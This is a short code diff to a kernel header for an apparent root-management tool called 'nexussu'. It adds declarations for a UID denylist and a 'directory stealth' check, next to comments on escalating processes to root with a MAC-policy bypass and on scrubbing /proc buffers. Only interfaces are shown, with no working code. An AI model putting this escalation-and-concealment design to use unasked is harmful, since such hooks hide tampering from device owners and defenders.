@@ -17,6 +17,14 @@ extern void nexussu_scrub_proc_buffer(struct file *file, char __user *buf, size_
 extern void nexussu_set_manager_uid(uid_t uid);
 extern bool nexussu_is_manager(uid_t uid);
 
+/* Denylist Logic */
+extern bool nexussu_is_denied(kuid_t kuid);
+extern void nexussu_add_deny_uid(uid_t uid);
+extern void nexussu_remove_deny_uid(uid_t uid);
+
+/* Directory Stealth Logic */
+extern bool nexussu_hide_dir_check(const char *name, int namlen);
+
 /* 
  * Core escalation function.
  * Swaps the current process credentials with UID 0 (root) and marks it for MAC bypass.
